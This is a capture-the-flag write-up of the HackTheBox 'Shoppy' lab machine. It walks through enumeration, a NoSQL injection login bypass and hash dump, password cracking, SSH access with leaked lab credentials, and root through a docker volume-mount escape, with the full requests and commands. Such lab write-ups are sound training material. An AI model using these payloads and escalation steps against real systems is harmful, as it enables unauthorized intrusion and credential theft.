---
layout: post
author: H4
---

![banner](/images/shoppy_banner.png)  
[Link](https://app.hackthebox.com/machines/Shoppy)

# discovery

We are starting with a simple `nmap` scan to identify the attack surface of the target.

## port scan
```bash
$ nmap -Pn 10.10.11.180       
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-12 15:09 EST
Nmap scan report for shoppy.htb (10.10.11.180)
Host is up (0.031s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

On port 80 we have a website.  
![landing page](/images/shoppy_landingpage.png)

## dir busting
```bash
$ gobuster dir -u http://shoppy.htb/ -w /usr/share/wordlists/dirb/common.txt -t 5 -x asp,aspx,txt,html -b 404,403
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://shoppy.htb/
[+] Method:                  GET
[+] Threads:                 5
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   403,404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt,html,asp,aspx
[+] Timeout:                 10s
===============================================================
2022/11/12 15:10:35 Starting gobuster in directory enumeration mode
===============================================================
/Admin                (Status: 302) [Size: 28] [--> /login]
/ADMIN                (Status: 302) [Size: 28] [--> /login]
/admin                (Status: 302) [Size: 28] [--> /login]
/assets               (Status: 301) [Size: 179] [--> /assets/]
/css                  (Status: 301) [Size: 173] [--> /css/]   
/exports              (Status: 301) [Size: 181] [--> /exports/]
/favicon.ico          (Status: 200) [Size: 213054]             
/fonts                (Status: 301) [Size: 177] [--> /fonts/]  
/images               (Status: 301) [Size: 179] [--> /images/] 
/js                   (Status: 301) [Size: 171] [--> /js/]     
/Login                (Status: 200) [Size: 1074]               
/login                (Status: 200) [Size: 1074]               
                                                               
===============================================================
2022/11/12 15:15:25 Finished
===============================================================
```

`Gobuster` shows a resource named `/login` which is basically the `admin` login of the website.

![admin login](/images/shoppy_adminlogin.png)

## subdomain enumeration
- Using `burp intruder`
- Using `/usr/share/seclists/Discovery/DNS/dns-Jhaddix.txt` as a subdomain wordlist

![subdomain enumeration](/images/shoppy_dns.png)

The domain `mattermost.shoppy.htb` is available.
{: .prompt-info }

![Mattermost login](/images/shoppy_mattermostlogin.png)

---
# exploitation
## `NoSQL` injection
It took me some time as I have to admit that I usually forget to check for `NoSQL` injections, but in the end I got it!  

### normal login request
```http
POST /login HTTP/1.1
Host: shoppy.htb
Content-Length: 29
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://shoppy.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://shoppy.htb/login
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: rl_anonymous_id=RudderEncrypt%3AU2FsdGVkX19FvvahQ%2B7ZEj%2FXSmcM95cOuWbQZOK%2BieIiFaolCJmdiE%2BF%2FdnL%2FRcwtHWHNQ1Ylydafx1MbTgo%2Bw%3D%3D; rl_group_id=RudderEncrypt%3AU2FsdGVkX19Mz5pAVIF%2FfhAv56FzvcYku%2BI0AI6QdKI%3D; rl_group_trait=RudderEncrypt%3AU2FsdGVkX1%2BmZVS906gLD7DEiyvYL237LlAXC1qnJns%3D; rl_user_id=RudderEncrypt%3AU2FsdGVkX1%2FGU%2BjXzsZd2y0qidarEHYAs6%2Bm4sIgmDyAMSvmUlHELYFlTFUaP5dT; rl_trait=RudderEncrypt%3AU2FsdGVkX1%2FJkvUtbKiJvcGDtYg6d4qCJmF%2BU3QwlZA%3D
Connection: close

username=admin&password=admin
```

### normal login response
```http
HTTP/1.1 302 Found
Server: nginx/1.23.1
Date: Sat, 12 Nov 2022 20:55:49 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 102
Connection: close
Location: /login?error=WrongCredentials
Vary: Accept

<p>Found. Redirecting to <a href="/login?error=WrongCredentials">/login?error=WrongCredentials</a></p>
```

> We can bypass the login with a simple `NoSQL` injection.  
> The parameter `username` in the login under `/login` is vulnerable.
{: .prompt-info }

### `NoSQL` injection login request
payload: `admin'||'a'=='a`
```http
POST /login HTTP/1.1
Host: shoppy.htb
Content-Length: 39
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://shoppy.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://shoppy.htb/login
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: rl_anonymous_id=RudderEncrypt%3AU2FsdGVkX19FvvahQ%2B7ZEj%2FXSmcM95cOuWbQZOK%2BieIiFaolCJmdiE%2BF%2FdnL%2FRcwtHWHNQ1Ylydafx1MbTgo%2Bw%3D%3D; rl_group_id=RudderEncrypt%3AU2FsdGVkX19Mz5pAVIF%2FfhAv56FzvcYku%2BI0AI6QdKI%3D; rl_group_trait=RudderEncrypt%3AU2FsdGVkX1%2BmZVS906gLD7DEiyvYL237LlAXC1qnJns%3D; rl_user_id=RudderEncrypt%3AU2FsdGVkX1%2FGU%2BjXzsZd2y0qidarEHYAs6%2Bm4sIgmDyAMSvmUlHELYFlTFUaP5dT; rl_trait=RudderEncrypt%3AU2FsdGVkX1%2FJkvUtbKiJvcGDtYg6d4qCJmF%2BU3QwlZA%3D
Connection: close

username=admin'||'a'%3d%3d'a&password=admin
```

### `NoSQL` injection login response
```http
HTTP/1.1 302 Found
Server: nginx/1.23.1
Date: Sat, 12 Nov 2022 20:55:43 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 56
Connection: close
Location: /admin
Vary: Accept
Set-Cookie: connect.sid=s%3AbCTW2RS6B4oe9sA5yuMLcpZJu16-9zP4.8HQJpH1JTowqRrzq0w0uuhenRKXzDdnq1qN4pjklN%2FI; Path=/; HttpOnly

<p>Found. Redirecting to <a href="/admin">/admin</a></p>
```

After we bypassed the login we are in the `admin` panel of the website. 

![admin area](/images/shoppy_adminarea.png)

There is a button to `Search for users`.

![user search](/images/shoppy_adminsearch1.png)

The `HTTP` request for this use case looks like this.

### request
```http
GET /admin/search-users?username=admin HTTP/1.1
Host: shoppy.htb
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://shoppy.htb/admin/search-users
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: rl_anonymous_id=RudderEncrypt%3AU2FsdGVkX19FvvahQ%2B7ZEj%2FXSmcM95cOuWbQZOK%2BieIiFaolCJmdiE%2BF%2FdnL%2FRcwtHWHNQ1Ylydafx1MbTgo%2Bw%3D%3D; rl_group_id=RudderEncrypt%3AU2FsdGVkX19Mz5pAVIF%2FfhAv56FzvcYku%2BI0AI6QdKI%3D; rl_group_trait=RudderEncrypt%3AU2FsdGVkX1%2BmZVS906gLD7DEiyvYL237LlAXC1qnJns%3D; rl_user_id=RudderEncrypt%3AU2FsdGVkX1%2FGU%2BjXzsZd2y0qidarEHYAs6%2Bm4sIgmDyAMSvmUlHELYFlTFUaP5dT; rl_trait=RudderEncrypt%3AU2FsdGVkX1%2FJkvUtbKiJvcGDtYg6d4qCJmF%2BU3QwlZA%3D; connect.sid=s%3AqWc6ShfgWwKRQfALZ5HsMWE0xgqktPrd.LvmgVhuX5AmOGVKLLonGH%2BPW7YT84LpkkPxKyEktP2M
Connection: close
```

### response
```http
HTTP/1.1 200 OK
Server: nginx/1.23.1
Date: Sat, 12 Nov 2022 21:02:34 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 2720
Connection: close
ETag: W/"aa0-pUWRV3sz7MffT6vwbjEaqagPcmk"

<!DOCTYPE html>
<html>

<head>
    <meta charset="utf-8">
...
```

After searching for `admin` we can download a file containing the admins password hash.

![user details download](/images/shoppy_adminsearch2.png)

The download of the `admin` hash looks like this.

### request
```http
GET /exports/export-search.json HTTP/1.1
Host: shoppy.htb
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://shoppy.htb/admin/search-users?username=admin
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: rl_anonymous_id=RudderEncrypt%3AU2FsdGVkX19FvvahQ%2B7ZEj%2FXSmcM95cOuWbQZOK%2BieIiFaolCJmdiE%2BF%2FdnL%2FRcwtHWHNQ1Ylydafx1MbTgo%2Bw%3D%3D; rl_group_id=RudderEncrypt%3AU2FsdGVkX19Mz5pAVIF%2FfhAv56FzvcYku%2BI0AI6QdKI%3D; rl_group_trait=RudderEncrypt%3AU2FsdGVkX1%2BmZVS906gLD7DEiyvYL237LlAXC1qnJns%3D; rl_user_id=RudderEncrypt%3AU2FsdGVkX1%2FGU%2BjXzsZd2y0qidarEHYAs6%2Bm4sIgmDyAMSvmUlHELYFlTFUaP5dT; rl_trait=RudderEncrypt%3AU2FsdGVkX1%2FJkvUtbKiJvcGDtYg6d4qCJmF%2BU3QwlZA%3D; connect.sid=s%3AqWc6ShfgWwKRQfALZ5HsMWE0xgqktPrd.LvmgVhuX5AmOGVKLLonGH%2BPW7YT84LpkkPxKyEktP2M
Connection: close
```

### response
```http
HTTP/1.1 200 OK
Server: nginx/1.23.1
Date: Sat, 12 Nov 2022 21:02:07 GMT
Content-Type: application/json; charset=UTF-8
Content-Length: 101
Connection: close
Accept-Ranges: bytes
Cache-Control: public, max-age=0
Last-Modified: Sat, 12 Nov 2022 20:59:58 GMT
ETag: W/"65-1846da45c4e"

[{"_id":"62db0e93d6d6a999a66ee67a","username":"admin","password":"23c6877d9e2b564ef8b32c3a23de27b2"}]
```

We now want to get all available hashes. Therefore we do the same kind of `NoSQL` injection like we did when bypassing the login page.

### request all user details
payload: `admin'||'a'=='a`
```http
GET /admin/search-users?username=admin'||'a'%3d%3d'a HTTP/1.1
Host: shoppy.htb
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://shoppy.htb/admin/search-users
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: rl_anonymous_id=RudderEncrypt%3AU2FsdGVkX19FvvahQ%2B7ZEj%2FXSmcM95cOuWbQZOK%2BieIiFaolCJmdiE%2BF%2FdnL%2FRcwtHWHNQ1Ylydafx1MbTgo%2Bw%3D%3D; rl_group_id=RudderEncrypt%3AU2FsdGVkX19Mz5pAVIF%2FfhAv56FzvcYku%2BI0AI6QdKI%3D; rl_group_trait=RudderEncrypt%3AU2FsdGVkX1%2BmZVS906gLD7DEiyvYL237LlAXC1qnJns%3D; rl_user_id=RudderEncrypt%3AU2FsdGVkX1%2FGU%2BjXzsZd2y0qidarEHYAs6%2Bm4sIgmDyAMSvmUlHELYFlTFUaP5dT; rl_trait=RudderEncrypt%3AU2FsdGVkX1%2FJkvUtbKiJvcGDtYg6d4qCJmF%2BU3QwlZA%3D; connect.sid=s%3AqWc6ShfgWwKRQfALZ5HsMWE0xgqktPrd.LvmgVhuX5AmOGVKLLonGH%2BPW7YT84LpkkPxKyEktP2M
Connection: close

```

### response all user details
```http
HTTP/1.1 200 OK
Server: nginx/1.23.1
Date: Sat, 12 Nov 2022 21:02:34 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 2720
Connection: close
ETag: W/"aa0-pUWRV3sz7MffT6vwbjEaqagPcmk"

<!DOCTYPE html>
<html>

<head>
    <meta charset="utf-8">
...
```

### request download user details
```http
GET /exports/export-search.json HTTP/1.1
Host: shoppy.htb
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://shoppy.htb/admin/search-users?username=admin
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: rl_anonymous_id=RudderEncrypt%3AU2FsdGVkX19FvvahQ%2B7ZEj%2FXSmcM95cOuWbQZOK%2BieIiFaolCJmdiE%2BF%2FdnL%2FRcwtHWHNQ1Ylydafx1MbTgo%2Bw%3D%3D; rl_group_id=RudderEncrypt%3AU2FsdGVkX19Mz5pAVIF%2FfhAv56FzvcYku%2BI0AI6QdKI%3D; rl_group_trait=RudderEncrypt%3AU2FsdGVkX1%2BmZVS906gLD7DEiyvYL237LlAXC1qnJns%3D; rl_user_id=RudderEncrypt%3AU2FsdGVkX1%2FGU%2BjXzsZd2y0qidarEHYAs6%2Bm4sIgmDyAMSvmUlHELYFlTFUaP5dT; rl_trait=RudderEncrypt%3AU2FsdGVkX1%2FJkvUtbKiJvcGDtYg6d4qCJmF%2BU3QwlZA%3D; connect.sid=s%3AqWc6ShfgWwKRQfALZ5HsMWE0xgqktPrd.LvmgVhuX5AmOGVKLLonGH%2BPW7YT84LpkkPxKyEktP2M
Connection: close
```

### response download user details
```http
HTTP/1.1 200 OK
Server: nginx/1.23.1
Date: Sat, 12 Nov 2022 21:02:36 GMT
Content-Type: application/json; charset=UTF-8
Content-Length: 200
Connection: close
Accept-Ranges: bytes
Cache-Control: public, max-age=0
Last-Modified: Sat, 12 Nov 2022 21:02:34 GMT
ETag: W/"c8-1846da6bcf6"

[{"_id":"62db0e93d6d6a999a66ee67a","username":"admin","password":"23c6877d9e2b564ef8b32c3a23de27b2"},{"_id":"62db0e93d6d6a999a66ee67b","username":"josh","password":"6ebcea65320589ca4f2f1ce039975995"}]
```

## crack the hashes

Now we saving the hashes in a file named `hash.txt` and try to crack them with `john`.  
`hash.txt` content
```bash
$ cat hash.txt                             
admin:23c6877d9e2b564ef8b32c3a23de27b2
josh:6ebcea65320589ca4f2f1ce039975995
```

Crack the hashes
```bash
$ john --format=Raw-MD5 hash.txt -wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 2 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
remembermethisway (josh)     
1g 0:00:00:00 DONE (2022-11-12 16:09) 1.219g/s 17491Kp/s 17491Kc/s 18482KC/s  fuckyooh21..*7¡Vamos!
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```

> Yes! We got the password of `josh` (`remembermethisway`).
{: .prompt-info }

## Mattermost
Lets log in to `Mattermost` with the account `josh`.  
After we logged in, we see `ssh` credentials in the channel `Deploy Machine`

![Mattermost credentials](/images/shoppy_mattermostcreds.png)

> We got some `ssh` credentials: `jaeger:Sh0ppyBest@pp!`
{: .prompt-info }

## logging in via `ssh`
```bash
$ ssh jaeger@10.10.11.180                           
The authenticity of host '10.10.11.180 (10.10.11.180)' can't be established.
ED25519 key fingerprint is SHA256:RISsnnLs1eloK7XlOTr2TwStHh2R8hui07wd1iFyB+8.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.180' (ED25519) to the list of known hosts.
jaeger@10.10.11.180's password: 
Linux shoppy 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
jaeger@shoppy:~$
```

> And we got a shell :-)
{: .prompt-info }

---

# post exploitation
## get first flag
```bash
jaeger@shoppy:~$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  ShoppyApp  shoppy_start.sh  Templates  user.txt  Videos
jaeger@shoppy:~$ cat user.txt
c******************************4
```

## privilege escalation
At first we are checking if we are allowed to execute commands as a super user.
```bash
$ sudo -l
Matching Defaults entries for jaeger on shoppy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jaeger may run the following commands on shoppy:
    (deploy) /home/deploy/password-manager
```

Lets check the file permissions of `/home/deploy/password-manager`.
```bash
$ ls -lsah /home/deploy/password-manager
20K -rwxr--r-- 1 deploy deploy 19K Jul 22 13:20 /home/deploy/password-manager
```
> Unfortunately we are not allowed to overwrite the file.
{: .prompt-danger }

Lets execute the file to see what it does.
```bash
$ sudo -u deploy /home/deploy/password-manager
Welcome to Josh password manager!
Please enter your master password: wdqqw
Access denied! This incident will be reported !
```

So we probably need the master password of `Josh` to proceed.  
  
Lets have a look into the file `password-manager`.
```bash
$ cat /home/deploy/password-manager
ELF> @H@@8
          @@@@h���`
                   `
                    ��   ���-�=�=�P�-�=����DDP�td� � � LLQ�tdR�td�-�=�=PP/lib64/ld-linux-x86-64.so.2GNU@
)�GNU�▒�e�ms��                                                                                          .�Ҵ��43H
              C-�����fFr�S�w �� , N�"�▒�A▒#▒�@__gmon_start___ITM_deregisterTMCloneTable_ITM_registerTMCloneTable_ZNSaIcED1Ev_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEC1Ev_ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6__ZSt3cin_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEC1EPKcRKS3__ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEpLEPKc_ZNSt8ios_base4InitD1Ev_ZNSolsEPFRSoS_E__gxx_personality_v0_ZNSaIcEC1Ev_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc_ZNSt8ios_base4InitC1Ev_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEED1Ev_ZSt4cout_ZNKSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEE7compareERKS4__ZStrsIcSt11char_traitsIcESaIcEERSt13basic_istreamIT_T0_ES7_RNSt7__cxx1112basic_stringIS4_S5_T1_EE_Unwind_Resume__cxa_atexitsystem__cxa_finalize__libc_start_mainlibstdc++.so.6libgcc_s.so.1libc.so.6GCC_3.0GLIBC_2.2.5CXXABI_1.3GLIBCXX_3.4GLIBCXX_3.4.21( P&y
                                        
x@�@H�H��/H��t��H���5�/�%�/@�%�/h������%�/h������%�/h������%�/h������%�/h������%�/h������%�/h������%�/h�p����%�/�`����%�/h      �P����%�/h
�@����%�/h
          �0����%�/h
H�=���.�DH�=I/H�B/H9�tH�n.H��t  �����H�=/H�5/H)�H��H��?H��H�H��tH�E.H����fD���=11u/UH�=�-H��t
���H��H�S,H��H������H�E�H�������H�E�H����������<H��H�E�H��������H��H�E�H���w����H��H�E�H���f���H��H�����h����   1]�����{���UH��SH��XH�5�
                                                                                                      ���H�]���UH��H���}��u��}�u2�}���u)H�=�.�����H�u,H�5�.H��+H���/������UH�����������]��AWL�=W)AVI��AUI��ATA��UH�-P)SL)�H������H��t�L��L��D��A��H��H9�u�H�[]A\A]A^A_��H�H��Welcome to Josh password manager!Please enter your master password: SampleAccess granted! Here is creds !cat /home/deploy/
```

There is a strange string named `Sample` just between the `Please enter your master password:` prompt and the possible result string named `Access granted`. This might be the master password. Lets check this.

```bash
$ sudo -u deploy /home/deploy/password-manager
Welcome to Josh password manager!
Please enter your master password: Sample
Access granted! Here is creds !
Deploy Creds :
username: deploy
password: Deploying@pp!
```

> Yes it worked! We now have the credentials of the user `deploy` (`deploy:Deploying@pp!`).
{: .prompt-info }

Switching to `deploy` now.
```bash
$ su deploy
Password: 
$ whoami
deploy
```

From the `Mattermost` chat we know that the deployment here is made with docker. The next step is to check if `docker` is available under the deployment account.

```bash
$ docker ps
CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES
$
```

Looks good! Check [gtfobins](https://gtfobins.github.io/gtfobins/docker/#shell) on how to get a shell to break out from restricted environments.

```bash
$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# whoami
root
```

> Yay! Root!
{: .prompt-info }

## get second flag
```bash
# cd /root
# ls
root.txt
# cat root.txt
3******************************b
```

Pwned! <@:-) 
